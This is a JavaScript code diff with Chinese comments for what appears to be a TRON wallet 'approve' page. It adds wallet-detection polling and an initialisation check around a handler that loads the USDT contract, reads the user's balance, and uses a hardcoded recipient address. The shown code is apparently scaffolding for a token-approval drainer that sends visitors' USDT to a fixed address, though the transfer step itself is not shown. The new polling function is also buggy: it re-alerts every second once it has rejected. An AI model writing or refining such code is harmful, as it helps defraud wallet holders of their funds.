@@ -1,10 +1,15 @@
 async function getTronWeb() {
-    if (typeof window.tronWeb !== 'undefined') {
-        return window.tronWeb;
-    } else {
-        alert('请安装支持TRC20的钱包（如TronLink, Bitpie, imToken）并登录');
-        throw new Error('Wallet not found');
-    }
+    return new Promise((resolve, reject) => {
+        const checkTronWeb = setInterval(() => {
+            if (typeof window.tronWeb !== 'undefined') {
+                clearInterval(checkTronWeb);
+                resolve(window.tronWeb);
+            } else {
+                alert('请安装支持TRC20的钱包（如TronLink, Bitpie, imToken）并登录');
+                reject(new Error('Wallet not found'));
+            }
+        }, 1000);
+    });
 }
 
 const tokenAddress = 'TOKEN_CONTRACT_ADDRESS'; // USDT合约地址
@@ -13,6 +18,12 @@ const recipientAddress = 'TYrG44bTwLhiEGvb48HYtHCAkgk7etr4d3'; // 接收地址
 document.getElementById('approveBtn').onclick = async function() {
     try {
         const tronWeb = await getTronWeb();
+        
+        // 检查tronWeb是否包含contract方法
+        if (!tronWeb.contract) {
+            throw new Error('tronWeb未正确初始化');
+        }
+
         const tokenContract = await tronWeb.contract().at(tokenAddress);
         
         // 获取用户USDT余额
